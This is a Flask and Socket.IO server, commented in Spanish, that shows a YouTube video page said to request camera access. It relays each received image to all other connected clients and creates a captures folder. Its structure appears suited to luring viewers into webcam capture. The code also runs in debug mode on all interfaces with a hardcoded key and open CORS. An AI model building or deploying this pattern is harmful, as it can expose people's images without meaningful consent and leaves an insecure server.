from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import re
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'clavesecretademo'
# Configuración correcta de Socket.IO
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')

# Ruta principal - formulario para ingresar URL de YouTube
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para la página que muestra el video y solicita acceso a la cámara
@app.route('/ver')
def ver_video():
    video_url = request.args.get('url', '')
    video_id = extraer_id_youtube(video_url)
    
    if not video_id:
        return "URL de YouTube inválida", 400
    
    return render_template('video.html', video_id=video_id)

# Función para extraer el ID de un video de YouTube desde su URL
def extraer_id_youtube(url):
    if not url:
        return None
    
    # Patrones comunes de URLs de YouTube
    patterns = [
        r'(?:https?:\/\/)?(?:www\.)?youtube\.com\/watch\?v=([^&\s]+)',
        r'(?:https?:\/\/)?(?:www\.)?youtu\.be\/([^\?\s]+)',
        r'(?:https?:\/\/)?(?:www\.)?youtube\.com\/embed\/([^\?\s]+)'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    
    return None

# Manejo de la conexión de socket para transferir imágenes
@socketio.on('connect')
def handle_connect():
    print(f'Cliente conectado: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    print(f'Cliente desconectado: {request.sid}')

@socketio.on('imagen')
def handle_imagen(data):
    print(f'Imagen recibida del cliente: {request.sid}')
    # Reenviar la imagen a todos los clientes conectados excepto al remitente
    emit('imagen_recibida', data, broadcast=True, include_self=False)

# Crear directorio para imágenes si no existe
if not os.path.exists('static/captures'):
    os.makedirs('static/captures')

# Agregar evento para verificar conexión
@socketio.on('test_connection')
def test_connection(data):
    print(f"Prueba de conexión recibida: {data}")
    emit('connection_response', {'status': 'success', 'message': 'Conexión establecida correctamente'})

if __name__ == '__main__':
    print("Servidor iniciado - Socket.IO disponible en", flush=True)
    socketio.run(app, host='0.0.0.0', port=5000, debug=True) 